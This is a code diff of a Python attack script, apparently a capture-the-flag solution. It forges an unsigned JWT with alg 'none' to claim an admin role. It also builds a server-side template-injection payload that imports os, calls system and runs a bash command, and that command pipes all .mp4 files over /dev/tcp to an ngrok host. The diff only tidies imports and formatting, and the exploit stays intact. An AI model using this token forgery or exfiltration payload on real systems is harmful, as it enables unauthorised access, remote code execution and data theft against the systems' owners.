@@ -2,16 +2,11 @@
 
 import hashlib
 import html
-import time
-import statistics
-import string
 
 import requests
 
 from base64 import (
     b64encode)
-from operator import (
-    itemgetter)
 
 from bs4 import (
     BeautifulSoup)
@@ -27,7 +22,7 @@ def get_admin_token(user=USER):
         b64encode(b'{"typ": "JWT", "alg": "none"}') +
         b'.' +
         b64encode(b'{"user": "' + user.encode('utf-8') +
-                  b'", "type": "admin", "pass": "' + 
+                  b'", "type": "admin", "pass": "' +
                   PASSWORD.encode('utf-8') + b'"}') +
         b'.'
     ).decode('utf-8')
@@ -93,7 +88,9 @@ def main():
     payload += '(' + dunder('import') + ")('os')"
     payload += "|attr('system')"
     payload += '('
-    payload += spacify("bash -c \\'cat *mp4 > /dev/tcp/0.tcp.ngrok.io/17617\\'")
+    payload += spacify(
+        "bash -c \\'cat *mp4 > /dev/tcp/0.tcp.ngrok.io/17617\\'"
+    )
     payload += ')'
     payload += '}}'
 
